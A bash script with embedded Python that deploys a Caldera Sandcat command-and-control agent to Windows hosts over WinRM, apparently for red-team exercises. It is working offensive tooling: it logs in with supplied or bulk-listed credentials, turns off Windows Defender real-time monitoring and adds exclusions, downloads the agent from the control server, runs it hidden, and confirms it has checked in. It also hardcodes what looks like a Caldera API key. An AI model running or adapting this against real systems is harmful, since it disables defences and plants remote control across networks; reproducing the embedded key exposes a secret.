#!/usr/bin/env bash
# =============================================================================
# Caldera Sandcat Agent - Windows Remote Deployment via WinRM
# Deploys sandcat.exe to Windows targets using pywinrm (NTLM auth)
# =============================================================================
set -euo pipefail

# --- Configuration ---
CALDERA_SERVER="${CALDERA_SERVER:-10.99.0.10}"
CALDERA_PORT="${CALDERA_PORT:-8888}"
CALDERA_URL="http://${CALDERA_SERVER}:${CALDERA_PORT}"
CALDERA_API="${CALDERA_URL}/api/v2"
CALDERA_API_KEY="${CALDERA_API_KEY:-Z_qZ-H_tO46ponEmcXpSg8JcySRzG9EMFg71Ojgy3VQ}"
DEFAULT_GROUP="claude"
AGENT_CHECK_RETRIES=12
AGENT_CHECK_INTERVAL=5
WINRM_PORT=5985
SCRIPT_NAME="$(basename "$0")"

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# --- Logging helpers ---
info()    { echo -e "${BLUE}[INFO]${NC}  $*"; }
ok()      { echo -e "${GREEN}[OK]${NC}    $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
fail()    { echo -e "${RED}[FAIL]${NC}  $*"; }
header()  { echo -e "\n${BOLD}${CYAN}=== $* ===${NC}"; }
step()    { echo -e "${CYAN}  -> ${NC}$*"; }

# --- Usage ---
usage() {
    cat <<USAGE
${BOLD}Caldera Sandcat Agent - Windows Remote Deployer${NC}

${BOLD}USAGE:${NC}
  ${SCRIPT_NAME} -t <IP> -u <user> -p <pass> [-g <group>]
  ${SCRIPT_NAME} -f <hostfile> [-g <group>]

${BOLD}OPTIONS:${NC}
  -t, --target <IP>        Target Windows host IP address
  -u, --user <user>        Windows username (e.g. Administrator)
  -p, --pass <password>    Windows password
  -g, --group <group>      Caldera agent group (default: ${DEFAULT_GROUP})
  -f, --hostfile <file>    File with targets, one per line: IP,user,password
  -s, --server <IP:PORT>   Caldera server address (default: ${CALDERA_SERVER}:${CALDERA_PORT})
  -k, --api-key <key>      Caldera API key (red team)
  -h, --help               Show this help text

${BOLD}EXAMPLES:${NC}
  # Deploy to a single host
  ${SCRIPT_NAME} -t 10.99.0.20 -u Administrator -p 'P@ssw0rd'

  # Deploy to a single host in a custom group
  ${SCRIPT_NAME} -t 10.99.0.20 -u Administrator -p 'P@ssw0rd' -g banking

  # Deploy to multiple hosts from a file
  ${SCRIPT_NAME} -f targets.txt -g red-team

  # targets.txt format (one host per line):
  #   10.99.0.20,Administrator,P@ssw0rd
  #   10.99.0.21,admin,Secret123!

${BOLD}PREREQUISITES:${NC}
  - Python 3 with pywinrm:  pip install pywinrm
  - WinRM enabled on target hosts (port ${WINRM_PORT})
  - curl (for Caldera API checks)

${BOLD}ENVIRONMENT VARIABLES:${NC}
  CALDERA_SERVER    Caldera server IP   (default: ${CALDERA_SERVER})
  CALDERA_PORT      Caldera server port (default: ${CALDERA_PORT})
  CALDERA_API_KEY   Red team API key
USAGE
    exit 0
}

# --- Dependency checks ---
check_dependencies() {
    local missing=0
    for cmd in python3 curl; do
        if ! command -v "$cmd" &>/dev/null; then
            fail "Required command not found: ${cmd}"
            missing=1
        fi
    done
    if ! python3 -c "import winrm" &>/dev/null; then
        fail "Python module 'pywinrm' is not installed. Install it with: pip install pywinrm"
        missing=1
    fi
    if [[ $missing -ne 0 ]]; then
        exit 1
    fi
    ok "All dependencies satisfied"
}

# --- Deploy to a single host (calls embedded Python) ---
deploy_to_host() {
    local target_ip="$1"
    local username="$2"
    local password="$3"
    local group="$4"

    header "Deploying to ${target_ip}"
    info "User: ${username} | Group: ${group}"

    # Run the embedded Python deployer
    python3 - "$target_ip" "$username" "$password" "$group" \
              "$CALDERA_SERVER" "$CALDERA_PORT" "$CALDERA_API_KEY" \
              "$AGENT_CHECK_RETRIES" "$AGENT_CHECK_INTERVAL" <<'PYTHON_SCRIPT'
import sys
import time
import json
import urllib.request
import urllib.error

# ---- Parse arguments ----
target_ip       = sys.argv[1]
username        = sys.argv[2]
password        = sys.argv[3]
group           = sys.argv[4]
caldera_server  = sys.argv[5]
caldera_port    = sys.argv[6]
api_key         = sys.argv[7]
max_retries     = int(sys.argv[8])
check_interval  = int(sys.argv[9])

caldera_url = f"http://{caldera_server}:{caldera_port}"

# ---- Color helpers ----
RED    = "\033[0;31m"
GREEN  = "\033[0;32m"
YELLOW = "\033[1;33m"
BLUE   = "\033[0;34m"
CYAN   = "\033[0;36m"
NC     = "\033[0m"

def info(msg):  print(f"{BLUE}[INFO]{NC}  {msg}")
def ok(msg):    print(f"{GREEN}[OK]{NC}    {msg}")
def warn(msg):  print(f"{YELLOW}[WARN]{NC}  {msg}")
def fail(msg):  print(f"{RED}[FAIL]{NC}  {msg}")
def step(msg):  print(f"{CYAN}  -> {NC}{msg}")

# ---- Import winrm ----
try:
    import winrm
except ImportError:
    fail("pywinrm is not installed. Run: pip install pywinrm")
    sys.exit(1)

# ---- Connect via WinRM ----
info(f"Connecting to {target_ip} via WinRM (NTLM)...")
try:
    session = winrm.Session(
        f"http://{target_ip}:5985/wsman",
        auth=(username, password),
        transport="ntlm",
        server_cert_validation="ignore",
        operation_timeout_sec=60,
        read_timeout_sec=90,
    )
    # Quick connectivity test
    result = session.run_cmd("hostname")
    if result.status_code != 0:
        fail(f"WinRM connected but hostname command failed (exit code {result.status_code})")
        sys.exit(1)
    hostname = result.std_out.decode("utf-8", errors="replace").strip()
    ok(f"Connected to host: {hostname}")
except Exception as e:
    fail(f"WinRM connection failed: {e}")
    sys.exit(1)

def run_cmd(session, cmd, description, ignore_errors=False):
    """Execute a command on the remote host with logging."""
    step(description)
    try:
        result = session.run_cmd(cmd)
        stdout = result.std_out.decode("utf-8", errors="replace").strip()
        stderr = result.std_err.decode("utf-8", errors="replace").strip()
        if result.status_code != 0 and not ignore_errors:
            warn(f"  Command exited with code {result.status_code}")
            if stderr:
                warn(f"  stderr: {stderr[:300]}")
        return result.status_code, stdout, stderr
    except Exception as e:
        if ignore_errors:
            warn(f"  Command failed (ignored): {e}")
            return -1, "", str(e)
        fail(f"  Command execution error: {e}")
        return -1, "", str(e)

def run_ps(session, ps_cmd, description, ignore_errors=False):
    """Execute a PowerShell command on the remote host."""
    step(description)
    try:
        result = session.run_ps(ps_cmd)
        stdout = result.std_out.decode("utf-8", errors="replace").strip()
        stderr = result.std_err.decode("utf-8", errors="replace").strip()
        if result.status_code != 0 and not ignore_errors:
            warn(f"  PowerShell exited with code {result.status_code}")
            if stderr:
                warn(f"  stderr: {stderr[:300]}")
        return result.status_code, stdout, stderr
    except Exception as e:
        if ignore_errors:
            warn(f"  Command failed (ignored): {e}")
            return -1, "", str(e)
        fail(f"  PowerShell execution error: {e}")
        return -1, "", str(e)

# ---- Step 1: Kill any existing sandcat process ----
info("Stopping any existing sandcat agent...")
run_ps(session,
    "Get-Process -Name sandcat -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue",
    "Killing sandcat.exe processes",
    ignore_errors=True
)
# Also kill by path in case the process name differs
run_cmd(session,
    'taskkill /F /IM sandcat.exe 2>nul',
    "Taskkill sandcat.exe (fallback)",
    ignore_errors=True
)
# Brief pause to let the process fully terminate
time.sleep(2)

# ---- Step 2: Add Windows Defender exclusions ----
info("Configuring Windows Defender exclusions...")

defender_commands = [
    ("Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue",
     "Adding Defender exclusion for %TEMP%"),
    ("Add-MpPreference -ExclusionProcess 'sandcat.exe' -ErrorAction SilentlyContinue",
     "Adding Defender exclusion for sandcat.exe"),
    ("Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue",
     "Disabling Defender realtime monitoring"),
]

defender_ok = True
for ps_cmd, desc in defender_commands:
    code, _, stderr = run_ps(session, ps_cmd, desc, ignore_errors=True)
    if code != 0 and "not recognized" not in stderr.lower():
        # Defender commands may fail on Server Core or if tamper protection is on
        if "denied" in stderr.lower() or "tamper" in stderr.lower():
            warn("  Defender may have tamper protection enabled -- exclusion might not apply")
            defender_ok = False

if defender_ok:
    ok("Defender exclusions configured")
else:
    warn("Some Defender exclusions may not have applied (tamper protection or insufficient privileges)")

# ---- Step 3: Download sandcat.exe from Caldera server ----
info("Downloading sandcat.exe from Caldera server...")

download_ps = f"""
$ErrorActionPreference = 'Stop'
$url = '{caldera_url}/file/download'
$outFile = "$env:TEMP\\sandcat.exe"

# Remove old binary if present
if (Test-Path $outFile) {{ Remove-Item $outFile -Force }}

$headers = @{{
    'platform' = 'windows'
    'file'     = 'sandcat.go'
}}
try {{
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $wc = New-Object System.Net.WebClient
    foreach ($h in $headers.GetEnumerator()) {{
        $wc.Headers.Add($h.Key, $h.Value)
    }}
    $wc.DownloadFile($url, $outFile)

    if (Test-Path $outFile) {{
        $size = (Get-Item $outFile).Length
        Write-Output "DOWNLOADED:$size"
    }} else {{
        Write-Output "DOWNLOAD_FAILED"
    }}
}} catch {{
    Write-Output "ERROR:$($_.Exception.Message)"
}}
"""

code, stdout, stderr = run_ps(session, download_ps, "Downloading sandcat.exe to %TEMP%")

if "DOWNLOADED:" in stdout:
    file_size = stdout.split("DOWNLOADED:")[1].strip()
    ok(f"sandcat.exe downloaded ({file_size} bytes)")
elif "ERROR:" in stdout:
    error_msg = stdout.split("ERROR:")[1].strip()
    fail(f"Download failed: {error_msg}")
    sys.exit(1)
else:
    fail(f"Download failed unexpectedly. stdout={stdout}, stderr={stderr}")
    sys.exit(1)

# ---- Step 4: Start sandcat agent ----
info("Starting sandcat agent...")

start_ps = f"""
$agentPath = "$env:TEMP\\sandcat.exe"
$server = '{caldera_url}'
$group = '{group}'

if (-not (Test-Path $agentPath)) {{
    Write-Output "BINARY_MISSING"
    exit 1
}}

# Start the agent as a background process
$proc = Start-Process -FilePath $agentPath `
    -ArgumentList "-server $server -group $group -v" `
    -PassThru -WindowStyle Hidden

Start-Sleep -Seconds 3

if ($proc -and -not $proc.HasExited) {{
    Write-Output "STARTED:$($proc.Id)"
}} else {{
    # Check if another instance is already running
    $existing = Get-Process -Name sandcat -ErrorAction SilentlyContinue
    if ($existing) {{
        Write-Output "STARTED:$($existing.Id)"
    }} else {{
        Write-Output "START_FAILED"
    }}
}}
"""

code, stdout, stderr = run_ps(session, start_ps, "Launching sandcat.exe agent")

if "STARTED:" in stdout:
    pid = stdout.split("STARTED:")[1].strip()
    ok(f"sandcat.exe started (PID: {pid})")
elif "BINARY_MISSING" in stdout:
    fail("sandcat.exe binary not found on remote host after download")
    sys.exit(1)
else:
    fail(f"Failed to start sandcat agent. stdout={stdout}, stderr={stderr}")
    sys.exit(1)

# ---- Step 5: Verify agent is running on remote host ----
info("Verifying agent process on remote host...")

verify_code, verify_out, _ = run_ps(session,
    "Get-Process -Name sandcat -ErrorAction SilentlyContinue | Select-Object Id, CPU, WorkingSet | Format-List",
    "Checking sandcat process status"
)

if verify_out and "Id" in verify_out:
    ok("sandcat agent is running on the remote host")
else:
    warn("Could not confirm sandcat process -- it may have exited or be running under a different name")

# ---- Step 6: Check Caldera API for agent registration ----
info(f"Waiting for agent to register with Caldera (up to {max_retries * check_interval}s)...")

agent_registered = False
agent_info = None

for attempt in range(1, max_retries + 1):
    step(f"Check {attempt}/{max_retries}...")
    try:
        req = urllib.request.Request(
            f"http://{caldera_server}:{caldera_port}/api/v2/agents",
            headers={
                "KEY": api_key,
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            agents = json.loads(resp.read().decode("utf-8"))

        # Look for an agent matching the target host
        for agent in agents:
            agent_host = agent.get("host", "").lower()
            agent_ip = agent.get("host_ip_addrs", [])
            agent_group = agent.get("group", "")

            # Match by hostname or IP address
            if (hostname.lower() == agent_host or
                target_ip in agent_ip or
                any(target_ip in addr for addr in agent_ip)):

                # Check if the agent is alive (seen recently)
                agent_registered = True
                agent_info = agent
                break

        if agent_registered:
            break

    except (urllib.error.URLError, urllib.error.HTTPError) as e:
        warn(f"  API request failed: {e}")
    except json.JSONDecodeError:
        warn("  Invalid JSON response from Caldera API")

    if attempt < max_retries:
        time.sleep(check_interval)

if agent_registered and agent_info:
    paw = agent_info.get("paw", "unknown")
    host = agent_info.get("host", "unknown")
    platform = agent_info.get("platform", "unknown")
    grp = agent_info.get("group", "unknown")
    ok(f"Agent registered with Caldera!")
    step(f"Paw: {paw}")
    step(f"Host: {host}")
    step(f"Platform: {platform}")
    step(f"Group: {grp}")
else:
    warn("Agent not yet visible in Caldera API.")
    warn("This may be normal -- the agent can take additional time to check in.")
    warn(f"Verify manually: curl -H 'KEY: {api_key}' {caldera_url}/api/v2/agents")

print()
ok(f"Deployment to {target_ip} complete.")
PYTHON_SCRIPT

    local py_exit=$?
    if [[ $py_exit -ne 0 ]]; then
        fail "Deployment to ${target_ip} failed (Python exit code: ${py_exit})"
        return 1
    fi
    return 0
}

# =============================================================================
# Main
# =============================================================================

# Parse arguments
TARGET=""
USERNAME=""
PASSWORD=""
GROUP="${DEFAULT_GROUP}"
HOSTFILE=""

if [[ $# -eq 0 ]]; then
    usage
fi

while [[ $# -gt 0 ]]; do
    case "$1" in
        -t|--target)   TARGET="$2";       shift 2 ;;
        -u|--user)     USERNAME="$2";     shift 2 ;;
        -p|--pass)     PASSWORD="$2";     shift 2 ;;
        -g|--group)    GROUP="$2";        shift 2 ;;
        -f|--hostfile) HOSTFILE="$2";     shift 2 ;;
        -s|--server)
            IFS=':' read -r CALDERA_SERVER CALDERA_PORT <<< "$2"
            CALDERA_URL="http://${CALDERA_SERVER}:${CALDERA_PORT}"
            CALDERA_API="${CALDERA_URL}/api/v2"
            shift 2 ;;
        -k|--api-key)  CALDERA_API_KEY="$2"; shift 2 ;;
        -h|--help)     usage ;;
        *)
            fail "Unknown option: $1"
            echo "Use -h for help."
            exit 1 ;;
    esac
done

# Banner
echo ""
echo -e "${BOLD}${CYAN}  Caldera Sandcat Agent - Windows Remote Deployer${NC}"
echo -e "${CYAN}  ================================================${NC}"
echo -e "  Server:  ${CALDERA_URL}"
echo -e "  Group:   ${GROUP}"
echo ""

# Dependency check
check_dependencies

# Validate inputs
if [[ -n "$HOSTFILE" ]]; then
    # Multi-host mode
    if [[ ! -f "$HOSTFILE" ]]; then
        fail "Host file not found: ${HOSTFILE}"
        exit 1
    fi

    total=0
    succeeded=0
    failed_hosts=()

    # Count non-empty, non-comment lines
    while IFS= read -r line || [[ -n "$line" ]]; do
        line="${line%%#*}"             # strip comments
        line="$(echo "$line" | xargs)" # trim whitespace
        [[ -z "$line" ]] && continue
        ((total++))
    done < "$HOSTFILE"

    info "Deploying to ${total} host(s) from ${HOSTFILE}"
    echo ""

    count=0
    while IFS= read -r line || [[ -n "$line" ]]; do
        line="${line%%#*}"
        line="$(echo "$line" | xargs)"
        [[ -z "$line" ]] && continue

        ((count++))

        IFS=',' read -r h_ip h_user h_pass <<< "$line"
        h_ip="$(echo "$h_ip" | xargs)"
        h_user="$(echo "$h_user" | xargs)"
        h_pass="$(echo "$h_pass" | xargs)"

        if [[ -z "$h_ip" || -z "$h_user" || -z "$h_pass" ]]; then
            fail "Invalid line in hostfile (expected IP,user,password): ${line}"
            failed_hosts+=("$h_ip (parse error)")
            continue
        fi

        echo -e "${BOLD}[${count}/${total}]${NC} Deploying to ${h_ip}..."
        if deploy_to_host "$h_ip" "$h_user" "$h_pass" "$GROUP"; then
            ((succeeded++))
        else
            failed_hosts+=("$h_ip")
        fi
    done < "$HOSTFILE"

    # Summary
    header "Deployment Summary"
    ok   "Succeeded: ${succeeded}/${total}"
    if [[ ${#failed_hosts[@]} -gt 0 ]]; then
        fail "Failed:    ${#failed_hosts[@]}/${total}"
        for fh in "${failed_hosts[@]}"; do
            fail "  - ${fh}"
        done
        exit 1
    fi
else
    # Single-host mode
    if [[ -z "$TARGET" || -z "$USERNAME" || -z "$PASSWORD" ]]; then
        fail "Single-host mode requires -t, -u, and -p options."
        echo "Use -h for help."
        exit 1
    fi

    deploy_to_host "$TARGET" "$USERNAME" "$PASSWORD" "$GROUP"
    exit $?
fi
